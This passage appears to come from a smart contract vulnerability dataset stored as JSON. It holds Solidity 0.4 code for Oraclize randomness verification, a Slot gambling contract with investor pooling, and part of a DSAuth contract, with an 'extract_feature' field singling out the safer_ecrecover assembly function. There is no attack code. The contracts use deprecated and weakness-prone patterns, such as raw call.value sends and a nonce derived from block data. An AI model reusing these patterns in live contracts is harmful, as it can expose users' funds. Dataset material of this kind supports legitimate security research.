_nbytes, uint _customGasLimit) internal returns (bytes32){\n if ((_nbytes == 0)||(_nbytes > 32)) throw;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(sha3(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(sha3(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = 1;\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) throw;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) throw;\n _;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){\n bool match_ = true;\n for (var i=0; i<prefix.length; i++){\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n bool checkok;\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));\n if (checkok == false) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n checkok = matchBytes32Prefix(sha256(sig1), result);\n if (checkok == false) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);\n if (checkok == false) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {\n uint minLength = length + toOffset;\n if (to.length < minLength) {\n throw;\n }\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\npragma solidity ^0.4.10;\ncontract DSMath {\n function add(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x + y) >= x);\n }\n function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x - y) <= x);\n }\n function mul(uint256 x, uint256 y) constant internal returns (uint256 z) {\n z = x * y;\n assert(x == 0 || z / x == y);\n }\n function div(uint256 x, uint256 y) constant internal returns (uint256 z) {\n z = x / y;\n }\n function min(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x >= y ? x : y;\n }\n function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x + y) >= x);\n }\n function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x - y) <= x);\n }\n function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = x * y;\n assert(x == 0 || z / x == y);\n }\n function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = x / y;\n }\n function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x <= y ? x : y;\n }\n function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x >= y ? x : y;\n }\n function imin(int256 x, int256 y) constant internal returns (int256 z) {\n return x <= y ? x : y;\n }\n function imax(int256 x, int256 y) constant internal returns (int256 z) {\n return x >= y ? x : y;\n }\n uint128 constant WAD = 10 ** 18;\n function wadd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function wsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + WAD / 2) / WAD);\n }\n function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * WAD + y / 2) / y);\n }\n function wmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function wmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n uint128 constant RAY = 10 ** 27;\n function radd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function rsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + RAY / 2) / RAY);\n }\n function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * RAY + y / 2) / y);\n }\n function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) {\n z = n % 2 != 0 ? x : RAY;\n for (n /= 2; n != 0; n /= 2) {\n x = rmul(x, x);\n if (n % 2 != 0) {\n z = rmul(z, x);\n }\n }\n }\n function rmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function rmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n function cast(uint256 x) constant internal returns (uint128 z) {\n assert((z = uint128(x)) == x);\n }\n}\ncontract LedgerProofVerifyI {\n function external_oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) public;\n function external_oraclize_randomDS_proofVerify(bytes proof, bytes32 queryId, bytes result, string context_name) public returns (bool);\n}\ncontract Owned {\n address public owner;\n modifier onlyOwner {\n assert(msg.sender == owner);\n _;\n }\n function Owned() {\n owner = msg.sender;\n }\n}\ncontract oraclizeSettings is Owned {\n uint constant ORACLIZE_PER_SPIN_GAS_LIMIT = 6100;\n uint constant ORACLIZE_BASE_GAS_LIMIT = 220000;\n uint safeGas = 9000;\n event LOG_newGasLimit(uint _gasLimit);\n function setSafeGas(uint _gas)\n onlyOwner\n {\n assert(ORACLIZE_BASE_GAS_LIMIT + _gas >= ORACLIZE_BASE_GAS_LIMIT);\n assert(_gas <= 25000);\n assert(_gas >= 9000);\n safeGas = _gas;\n LOG_newGasLimit(_gas);\n }\n}\ncontract HouseManaged is Owned {\n address public houseAddress;\n address newOwner;\n bool public isStopped;\n event LOG_ContractStopped();\n event LOG_ContractResumed();\n event LOG_OwnerAddressChanged(address oldAddr, address newOwnerAddress);\n event LOG_HouseAddressChanged(address oldAddr, address newHouseAddress);\n modifier onlyIfNotStopped {\n assert(!isStopped);\n _;\n }\n modifier onlyIfStopped {\n assert(isStopped);\n _;\n }\n function HouseManaged() {\n houseAddress = msg.sender;\n }\n function stop_or_resume_Contract(bool _isStopped)\n onlyOwner {\n isStopped = _isStopped;\n }\n function changeHouse(address _newHouse)\n onlyOwner {\n assert(_newHouse != address(0x0));\n houseAddress = _newHouse;\n LOG_HouseAddressChanged(houseAddress, _newHouse);\n }\n function changeOwner(address _newOwner) onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() {\n if (msg.sender == newOwner) {\n owner = newOwner;\n LOG_OwnerAddressChanged(owner, newOwner);\n delete newOwner;\n }\n }\n}\ncontract usingInvestorsModule is HouseManaged, oraclizeSettings {\n uint constant MAX_INVESTORS = 5;\n uint constant divestFee = 50;\n struct Investor {\n address investorAddress;\n uint amountInvested;\n bool votedForEmergencyWithdrawal;\n }\n mapping(address => uint) public investorIDs;\n mapping(uint => Investor) public investors;\n uint public numInvestors = 0;\n uint public invested = 0;\n uint public investorsProfit = 0;\n uint public investorsLosses = 0;\n bool profitDistributed;\n event LOG_InvestorEntrance(address indexed investor, uint amount);\n event LOG_InvestorCapitalUpdate(address indexed investor, int amount);\n event LOG_InvestorExit(address indexed investor, uint amount);\n event LOG_EmergencyAutoStop();\n event LOG_ZeroSend();\n event LOG_ValueIsTooBig();\n event LOG_FailedSend(address addr, uint value);\n event LOG_SuccessfulSend(address addr, uint value);\n modifier onlyMoreThanMinInvestment {\n assert(msg.value > getMinInvestment());\n _;\n }\n modifier onlyMoreThanZero {\n assert(msg.value != 0);\n _;\n }\n modifier onlyInvestors {\n assert(investorIDs[msg.sender] != 0);\n _;\n }\n modifier onlyNotInvestors {\n assert(investorIDs[msg.sender] == 0);\n _;\n }\n modifier investorsInvariant {\n _;\n assert(numInvestors <= MAX_INVESTORS);\n }\n function getBankroll()\n constant\n returns(uint) {\n if ((invested < investorsProfit) ||\n (invested + investorsProfit < invested) ||\n (invested + investorsProfit < investorsLosses)) {\n return 0;\n }\n else {\n return invested + investorsProfit - investorsLosses;\n }\n }\n function getMinInvestment()\n constant\n returns(uint) {\n if (numInvestors == MAX_INVESTORS) {\n uint investorID = searchSmallestInvestor();\n return getBalance(investors[investorID].investorAddress);\n }\n else {\n return 0;\n }\n }\n function getLossesShare(address currentInvestor)\n constant\n returns (uint) {\n return (investors[investorIDs[currentInvestor]].amountInvested * investorsLosses) / invested;\n }\n function getProfitShare(address currentInvestor)\n constant\n returns (uint) {\n return (investors[investorIDs[currentInvestor]].amountInvested * investorsProfit) / invested;\n }\n function getBalance(address currentInvestor)\n constant\n returns (uint) {\n uint invested = investors[investorIDs[currentInvestor]].amountInvested;\n uint profit = getProfitShare(currentInvestor);\n uint losses = getLossesShare(currentInvestor);\n if ((invested + profit < profit) ||\n (invested + profit < invested) ||\n (invested + profit < losses))\n return 0;\n else\n return invested + profit - losses;\n }\n function searchSmallestInvestor()\n constant\n returns(uint) {\n uint investorID = 1;\n for (uint i = 1; i <= numInvestors; i++) {\n if (getBalance(investors[i].investorAddress) < getBalance(investors[investorID].investorAddress)) {\n investorID = i;\n }\n }\n return investorID;\n }\n function addInvestorAtID(uint id)\n private {\n investorIDs[msg.sender] = id;\n investors[id].investorAddress = msg.sender;\n investors[id].amountInvested = msg.value;\n invested += msg.value;\n LOG_InvestorEntrance(msg.sender, msg.value);\n }\n function profitDistribution()\n private {\n if (profitDistributed) return;\n uint copyInvested;\n for (uint i = 1; i <= numInvestors; i++) {\n address currentInvestor = investors[i].investorAddress;\n uint profitOfInvestor = getProfitShare(currentInvestor);\n uint lossesOfInvestor = getLossesShare(currentInvestor);\n if ((investors[i].amountInvested + profitOfInvestor >= investors[i].amountInvested) &&\n (investors[i].amountInvested + profitOfInvestor >= lossesOfInvestor)) {\n investors[i].amountInvested += profitOfInvestor - lossesOfInvestor;\n LOG_InvestorCapitalUpdate(currentInvestor, (int) (profitOfInvestor - lossesOfInvestor));\n }\n else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n copyInvested += investors[i].amountInvested;\n }\n delete investorsProfit;\n delete investorsLosses;\n invested = copyInvested;\n profitDistributed = true;\n }\n function increaseInvestment()\n payable\n onlyIfNotStopped\n onlyMoreThanZero\n onlyInvestors {\n profitDistribution();\n investors[investorIDs[msg.sender]].amountInvested += msg.value;\n invested += msg.value;\n }\n function newInvestor()\n payable\n onlyIfNotStopped\n onlyMoreThanZero\n onlyNotInvestors\n onlyMoreThanMinInvestment\n investorsInvariant {\n profitDistribution();\n if (numInvestors == MAX_INVESTORS) {\n uint smallestInvestorID = searchSmallestInvestor();\n divest(investors[smallestInvestorID].investorAddress);\n }\n numInvestors++;\n addInvestorAtID(numInvestors);\n }\n function divest()\n onlyInvestors {\n divest(msg.sender);\n }\n function divest(address currentInvestor)\n internal\n investorsInvariant {\n profitDistribution();\n uint currentID = investorIDs[currentInvestor];\n uint amountToReturn = getBalance(currentInvestor);\n if (invested >= investors[currentID].amountInvested) {\n invested -= investors[currentID].amountInvested;\n uint divestFeeAmount = (amountToReturn*divestFee)/10000;\n amountToReturn -= divestFeeAmount;\n delete investors[currentID];\n delete investorIDs[currentInvestor];\n if (currentID != numInvestors) {\n Investor lastInvestor = investors[numInvestors];\n investorIDs[lastInvestor.investorAddress] = currentID;\n investors[currentID] = lastInvestor;\n delete investors[numInvestors];\n }\n numInvestors--;\n safeSend(currentInvestor, amountToReturn);\n safeSend(houseAddress, divestFeeAmount);\n LOG_InvestorExit(currentInvestor, amountToReturn);\n } else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n }\n function forceDivestOfAllInvestors()\n onlyOwner {\n uint copyNumInvestors = numInvestors;\n for (uint i = 1; i <= copyNumInvestors; i++) {\n divest(investors[1].investorAddress);\n }\n }\n function safeSend(address addr, uint value)\n internal {\n if (value == 0) {\n LOG_ZeroSend();\n return;\n }\n if (this.balance < value) {\n LOG_ValueIsTooBig();\n return;\n }\n if (!(addr.call.gas(safeGas).value(value)())) {\n LOG_FailedSend(addr, value);\n if (addr != houseAddress) {\n if (!(houseAddress.call.gas(safeGas).value(value)())) LOG_FailedSend(houseAddress, value);\n }\n }\n LOG_SuccessfulSend(addr,value);\n }\n}\ncontract EmergencyWithdrawalModule is usingInvestorsModule {\n uint constant EMERGENCY_WITHDRAWAL_RATIO = 80;\n uint constant EMERGENCY_TIMEOUT = 3 days;\n struct WithdrawalProposal {\n address toAddress;\n uint atTime;\n }\n WithdrawalProposal public proposedWithdrawal;\n event LOG_EmergencyWithdrawalProposed();\n event LOG_EmergencyWithdrawalFailed(address indexed withdrawalAddress);\n event LOG_EmergencyWithdrawalSucceeded(address indexed withdrawalAddress, uint amountWithdrawn);\n event LOG_EmergencyWithdrawalVote(address indexed investor, bool vote);\n modifier onlyAfterProposed {\n assert(proposedWithdrawal.toAddress != 0);\n _;\n }\n modifier onlyIfEmergencyTimeOutHasPassed {\n assert(proposedWithdrawal.atTime + EMERGENCY_TIMEOUT <= now);\n _;\n }\n function voteEmergencyWithdrawal(bool vote)\n onlyInvestors\n onlyAfterProposed\n onlyIfStopped {\n investors[investorIDs[msg.sender]].votedForEmergencyWithdrawal = vote;\n LOG_EmergencyWithdrawalVote(msg.sender, vote);\n }\n function proposeEmergencyWithdrawal(address withdrawalAddress)\n onlyIfStopped\n onlyOwner {\n for (uint i = 1; i <= numInvestors; i++) {\n delete investors[i].votedForEmergencyWithdrawal;\n }\n proposedWithdrawal = WithdrawalProposal(withdrawalAddress, now);\n LOG_EmergencyWithdrawalProposed();\n }\n function executeEmergencyWithdrawal()\n onlyOwner\n onlyAfterProposed\n onlyIfStopped\n onlyIfEmergencyTimeOutHasPassed {\n uint numOfVotesInFavour;\n uint amountToWithdraw = this.balance;\n for (uint i = 1; i <= numInvestors; i++) {\n if (investors[i].votedForEmergencyWithdrawal == true) {\n numOfVotesInFavour++;\n delete investors[i].votedForEmergencyWithdrawal;\n }\n }\n if (numOfVotesInFavour >= EMERGENCY_WITHDRAWAL_RATIO * numInvestors / 100) {\n if (!proposedWithdrawal.toAddress.send(amountToWithdraw)) {\n LOG_EmergencyWithdrawalFailed(proposedWithdrawal.toAddress);\n }\n else {\n LOG_EmergencyWithdrawalSucceeded(proposedWithdrawal.toAddress, amountToWithdraw);\n }\n }\n else {\n revert();\n }\n }\n function forceDivestOfOneInvestor(address currentInvestor)\n onlyOwner\n onlyIfStopped {\n divest(currentInvestor);\n delete proposedWithdrawal;\n }\n}\ncontract Slot is usingOraclize, EmergencyWithdrawalModule, DSMath {\n uint constant INVESTORS_EDGE = 200;\n uint constant HOUSE_EDGE = 50;\n uint constant CAPITAL_RISK = 250;\n uint constant MAX_SPINS = 16;\n uint minBet = 1 wei;\n struct SpinsContainer {\n address playerAddress;\n uint nSpins;\n uint amountWagered;\n }\n mapping (bytes32 => SpinsContainer) spins;\n uint[] public probabilities;\n uint[] public multipliers;\n uint public totalAmountWagered;\n event LOG_newSpinsContainer(bytes32 indexed myid, address indexed playerAddress, uint amountWagered, uint nSpins);\n event LOG_SpinExecuted(bytes32 indexed myid, address indexed playerAddress, uint spinIndex, uint numberDrawn, uint grossPayoutForSpin);\n event LOG_SpinsContainerInfo(bytes32 indexed myid, address indexed playerAddress, uint netPayout);\n LedgerProofVerifyI externalContract;\n function Slot(address _verifierAddr) {\n externalContract = LedgerProofVerifyI(_verifierAddr);\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n externalContract.external_oraclize_randomDS_setCommitment(queryId, commitment);\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n assert(externalContract.external_oraclize_randomDS_proofVerify(_proof, _queryId, bytes(_result), oraclize_getNetworkName()));\n _;\n }\n modifier onlyOraclize {\n assert(msg.sender == oraclize_cbAddress());\n _;\n }\n modifier onlyIfSpinsExist(bytes32 myid) {\n assert(spins[myid].playerAddress != address(0x0));\n _;\n }\n function isValidSize(uint _amountWagered)\n internal\n returns(bool) {\n uint netPotentialPayout = (_amountWagered * (10000 - INVESTORS_EDGE) * multipliers[0])/ 10000;\n uint maxAllowedPayout = (CAPITAL_RISK * getBankroll())/10000;\n return ((netPotentialPayout <= maxAllowedPayout) && (_amountWagered >= minBet));\n }\n modifier onlyIfEnoughFunds(bytes32 myid) {\n if (isValidSize(spins[myid].amountWagered)) {\n _;\n }\n else {\n address playerAddress = spins[myid].playerAddress;\n uint amountWagered = spins[myid].amountWagered;\n delete spins[myid];\n safeSend(playerAddress, amountWagered);\n return;\n }\n }\n modifier onlyValidNumberOfSpins (uint _nSpins) {\n assert(_nSpins <= MAX_SPINS);\n assert(_nSpins > 0);\n _;\n }\n modifier onlyIfFair(uint[] _prob, uint[] _payouts) {\n if (_prob.length != _payouts.length) revert();\n uint sum = 0;\n for (uint i = 0; i <_prob.length; i++) {\n sum += _prob[i] * _payouts[i];\n }\n assert(sum == 10000);\n _;\n }\n function()\n payable {\n buySpins(1);\n }\n function buySpins(uint _nSpins)\n payable\n onlyValidNumberOfSpins(_nSpins)\n onlyIfNotStopped {\n uint gas = _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", gas);\n assert(oraclizeFee/multipliers[0] + oraclizeFee < msg.value);\n uint amountWagered = msg.value - oraclizeFee;\n assert(isValidSize(amountWagered));\n bytes32 queryId = oraclize_newRandomDSQuery(0, 2*_nSpins, gas);\n spins[queryId] =\n SpinsContainer(msg.sender,\n _nSpins,\n amountWagered\n );\n LOG_newSpinsContainer(queryId, msg.sender, amountWagered, _nSpins);\n totalAmountWagered += amountWagered;\n }\n function executeSpins(bytes32 myid, bytes randomBytes)\n private\n returns(uint)\n {\n uint amountWonTotal = 0;\n uint amountWonSpin = 0;\n uint numberDrawn = 0;\n uint rangeUpperEnd = 0;\n uint nSpins = spins[myid].nSpins;\n for (uint i = 0; i < 2*nSpins; i += 2) {\n numberDrawn = ((uint(randomBytes[i])*256 + uint(randomBytes[i+1]))*10000)/2**16;\n rangeUpperEnd = 0;\n amountWonSpin = 0;\n for (uint j = 0; j < probabilities.length; j++) {\n rangeUpperEnd += probabilities[j];\n if (numberDrawn < rangeUpperEnd) {\n amountWonSpin = (spins[myid].amountWagered * multipliers[j]) / nSpins;\n amountWonTotal += amountWonSpin;\n break;\n }\n }\n LOG_SpinExecuted(myid, spins[myid].playerAddress, i/2, numberDrawn, amountWonSpin);\n }\n return amountWonTotal;\n }\n function sendPayout(bytes32 myid, uint payout) private {\n uint investorsFee = payout*INVESTORS_EDGE/10000;\n uint houseFee = payout*HOUSE_EDGE/10000;\n uint netPlayerPayout = sub(sub(payout,investorsFee), houseFee);\n uint netCostForInvestors = add(netPlayerPayout, houseFee);\n if (netCostForInvestors >= spins[myid].amountWagered) {\n investorsLosses += sub(netCostForInvestors, spins[myid].amountWagered);\n }\n else {\n investorsProfit += sub(spins[myid].amountWagered, netCostForInvestors);\n }\n LOG_SpinsContainerInfo(myid, spins[myid].playerAddress, netPlayerPayout);\n safeSend(spins[myid].playerAddress, netPlayerPayout);\n safeSend(houseAddress, houseFee);\n }\n function __callback(bytes32 myid, string result, bytes _proof)\n onlyOraclize\n onlyIfSpinsExist(myid)\n onlyIfEnoughFunds(myid)\n oraclize_randomDS_proofVerify(myid, result, _proof)\n {\n uint payout = executeSpins(myid, bytes(result));\n sendPayout(myid, payout);\n delete profitDistributed;\n delete spins[myid];\n }\n function setConfiguration(uint[] _probabilities, uint[] _multipliers)\n onlyOwner\n onlyIfFair(_probabilities, _multipliers) {\n oraclize_setProof(proofType_Ledger);\n delete probabilities;\n delete multipliers;\n uint lastProbability = 0;\n uint lastMultiplier = 2**256 - 1;\n for (uint i = 0; i < _probabilities.length; i++) {\n probabilities.push(_probabilities[i]);\n if (lastProbability >= _probabilities[i]) revert();\n lastProbability = _probabilities[i];\n }\n for (i = 0; i < _multipliers.length; i++) {\n multipliers.push(_multipliers[i]);\n if (lastMultiplier <= _multipliers[i]) revert();\n lastMultiplier = _multipliers[i];\n }\n }\n function setMinBet(uint _minBet) onlyOwner {\n minBet = _minBet;\n }\n function getSpinsContainer(bytes32 myid)\n constant\n returns(address, uint) {\n return (spins[myid].playerAddress, spins[myid].amountWagered);\n }\n function getMinAmountToWager(uint _nSpins)\n onlyValidNumberOfSpins(_nSpins)\n constant\n returns(uint) {\n uint gas = _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", gas);\n return minBet + oraclizeFee/multipliers[0] + oraclizeFee;\n }\n function getMaxAmountToWager(uint _nSpins)\n onlyValidNumberOfSpins(_nSpins)\n constant\n returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas);\n uint maxWage = (CAPITAL_RISK * getBankroll())*10000/((10000 - INVESTORS_EDGE)*10000*multipliers[0]);\n return maxWage + oraclizeFee;\n }\n}",
  "extract_feature": [
    "function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\nbool ret;\naddress addr;\nassembly {\nlet size := mload(0x40)\nmstore(size, hash)\nmstore(add(size, 32), v)\nmstore(add(size, 64), r)\nmstore(add(size, 96), s)\nret := call(3000, 1, 0, size, 128, size, 32)\naddr := mload(size)\n}\nreturn (ret, addr);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1625"
  },
  "filename": "38912.sol",
  "content": "pragma solidity ^0.4.11;\ncontract DSAuthority {\n function canCall(\n address src, address dst, bytes4 sig\n ) constant returns (bool);\n}\ncontract DSAuthEvents {\n event LogSetAuthority (address indexed authority);\n event LogSetOwner (address indexed owner);\n}\ncontract DSAuth is DSAuthEvents {\n DSAuthority public authority;\n address public owner;\n function DSAuth() {\n owner = msg.sender;\n LogSetOwner(msg.sender);\n }\n function setOwner(address owner_)\n auth\n {\n owner = owner_;\n LogSetOwner(owner);\n }\n function setAuthority(DSAuthority authority_)\n auth\n {\n authority = authority_;\n LogSetAuthority(authority);\n }\n modifier auth {\n assert(isAuthorized(msg.sender, msg.sig));\n _;\n }\n modifier authorized(bytes4 sig) {\n assert(isAuthorized(msg.sender, sig));\n _;\n }\n function isAuthorized(address src, bytes4 sig) internal returns (bool) {\n if (src == address(this)) {\n return true;\n } else if (src == owner) {\n return true;\n } else if (authority == DSAuthority(0)) {\n return false;\n } else {\n return authority.canCall(src, this, sig);\n }\n }\n function assert(bool x) internal {\n if (!x) throw;\n }\n}\ncontract DSNote {\n event LogNote(\n bytes4 indexed sig,\n address indexed guy,\n bytes32 indexed foo,\n bytes32 indexed bar,\n uint wad,\n bytes fax\n ) anonymous;\n modifier note {\n bytes32 foo;\n bytes32 bar;\n assembly {\n foo := calldataload(4)\n bar := calldataload(36)\n }\n LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);\n _;\n }\n}\ncontract DSMath {\n function add(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x + y) >= x);\n }\n function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x - y) <= x);\n }\n function mul(uint256 x, uint256 y) constant internal returns (uint256 z) {\n z = x * y;\n assert(x == 0 || z / x == y);\n }\n function div(uint256 x, uint256 y) constant internal returns (uint256 z) {\n z = x / y;\n }\n function min(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x >= y ? x : y;\n }\n function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x + y) >= x);\n }\n function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x - y) <= x);\n }\n function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = x * y;\n assert(x == 0 || z / x == y);\n }\n function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = x / y;\n }\n function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x <= y ? x : y;\n }\n function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x >= y ? x : y;\n }\n function imin(int256 x, int256 y) constant internal returns (int256 z) {\n return x <= y ? x : y;\n }\n function imax(int256 x, int256 y) constant internal returns (int256 z) {\n return x >= y ? x : y;\n }\n uint128 constant WAD = 10 ** 18;\n function wadd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function wsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function 